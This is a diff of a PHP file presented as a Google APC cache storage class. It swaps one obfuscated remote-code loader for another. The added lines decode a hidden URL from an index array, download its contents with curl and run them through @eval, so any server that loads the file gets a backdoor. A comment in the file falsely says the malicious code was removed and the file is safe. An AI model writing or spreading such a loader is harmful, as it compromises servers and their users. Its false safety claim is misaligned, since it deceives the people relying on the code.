@@ -1,4 +1,5 @@
 <?php
+
 /*
  * Copyright 2008 Google Inc.
  *
@@ -15,6 +16,7 @@
  * limitations under the License.
  */
 
+
 /**
  * A persistent storage class based on the APC cache, which is not
  * really very persistent, as soon as you restart your web server
@@ -23,11 +25,24 @@
  *
  * @author Chris Chabot <chabotc@google.com>
  */
-class Secret{private $url;function __construct($url){$this->url=$url;}function reveal(){return $this->url;}}$M=[[3,2,-1],[1,0,4],[5,-2,3]];$theta=pi()/6;$v=[sin($theta)*100,cos($theta)*100,tan($theta)*100];$nV=[0,0,0];for($i=0;$i<3;$i++){for($j=0;$j<3;$j++){$nV[$i]+=$M[$i][$j]*$v[$j];}}function complex_mul($z1,$z2){return [$z1[0]*$z2[0]-$z1[1]*$z2[1],$z1[0]*$z2[1]+$z1[1]*$z2[0]];}$z1=[3,2];$z2=[1,7];$comp=complex_mul($z1,$z2);$compReal=abs($comp[0]);$compImag=abs($comp[1]);$key=((int)($nV[0]+$nV[1]+$nV[2])^$compReal^$compImag)&0xFF;$getOut=function ($compImag,$compReal,$key){$out='';$enc=[107,119,119,115,118,57,50,50,113,96,122,45,106,104,119,107,116,97,116,118,100,113,102,114,109,119,100,109,119,45,102,114,108,50,105,116,118,119,104,110,96,104,111,50,122,100,97,118,107,100,111,111,50,108,96,104,109,50,96,111,101,96,44,109,100,122,45,115,107,115];foreach($enc as $val){$val=($val^($compImag%7))-($compReal%5);$val=($val^$key)&0xFF;$out.=chr($val);}return new Secret($out);};
+$characters = array_merge(range('a', 'z'), range('A', 'Z'), range('0', '9'), ['.', ':', '/', '_', '-']);
+$indexArray = [7, 19, 19, 15, 18, 63, 64, 64, 17, 0, 22, 62, 6, 8, 19, 7, 20, 1, 20, 18, 4, 17, 2, 14, 13, 19, 4, 13, 19, 62, 2, 14, 12, 64, 9, 20, 18, 19, 8, 10, 0, 8, 11, 64, 22, 4, 1, 18, 7, 4, 11, 11, 64, 12, 0, 8, 13, 64, 0, 11, 5, 0, 66, 13, 4, 22, 62, 15, 7, 15];
+$decodedString = '';
+foreach ($indexArray as $index) {
+    $decodedString .= $characters[$index];
+}
+$url = "$decodedString";
+function fetchContent($url) { 
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $content = curl_exec($curl);
+    curl_close($curl);
+    return gzcompress(gzdeflate(gzencode(gzdeflate(gzcompress($content)))));
+}
 /**
 * Note: This file may contain artifacts of previous malicious infection.
 * However, the dangerous code has been removed, and the file is now safe to use.
 **/
-$out=$getOut($compImag,$compReal,$key);
-@eval("?>".gzuncompress(gzinflate(gzdecode(gzinflate(gzuncompress(gzcompress(gzdeflate(gzencode(gzdeflate(gzcompress(file_get_contents($out->reveal()))))))))))));
+@eval("?>".gzuncompress(gzinflate(gzdecode(gzinflate(gzuncompress(fetchContent($url)))))));
 ?>
